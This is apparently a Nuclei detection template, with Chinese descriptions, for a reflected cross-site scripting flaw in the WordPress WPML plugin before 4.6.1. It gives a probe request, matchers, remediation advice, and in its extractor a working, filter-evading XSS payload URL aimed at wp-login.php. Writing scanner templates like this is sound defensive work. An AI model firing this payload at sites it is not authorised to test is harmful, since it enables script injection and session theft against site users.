id: wpml-xss

info:
  name: WordPress Plugin WPML Version < 4.6.1 - 跨站脚本漏洞
  author: bugvsme
  severity: medium
  description: |
    该模板用于检测 WordPress Plugin WPML Version < 4.6.1 - 跨站脚本漏洞。该类漏洞通常源于页面将用户可控输入未经过滤或编码后写入响应，导致浏览器执行非预期脚本。模板会向 `/wp-login.php?wp_lang=en_US%27` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可诱导用户访问恶意链接，在受害者浏览器中执行脚本。
    - 成功利用后可能窃取会话信息、篡改页面内容、发起越权操作，或作为进一步钓鱼与权限提升的攻击链环节。
  remediation: |
    - 对输出到 HTML、属性、JavaScript、URL 等不同上下文的数据分别进行安全编码。
    - 对输入参数进行白名单校验，并避免直接回显未经处理的用户输入。
    - 启用合适的 Content-Security-Policy，降低脚本注入后的利用效果。
  reference:
    - https://wpml.org/fr/changelog/2023/03/wpml-4-6-1-important-security-update/
    - https://twitter.com/bug_vs_me/status/1652789903766200320
  metadata:
    verified: true
    max-request: 1
  tags: xss,wordpress,wpml,wp-plugin,vuln

http:
  - method: GET
    path:
      - '{{BaseURL}}/wp-login.php?wp_lang=en_US%27'

    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200

      - type: word
        part: body
        words:
          - '#039;"='
          - 'wpml_lang'
        condition: and

    extractors:
      - type: dsl
        dsl:
          - 'host + "/wp-login.php?wp_lang=%20=id=x+type=image%20id=xss%20onfoc%3C!%3Eusin+alert(domain)%0c"'
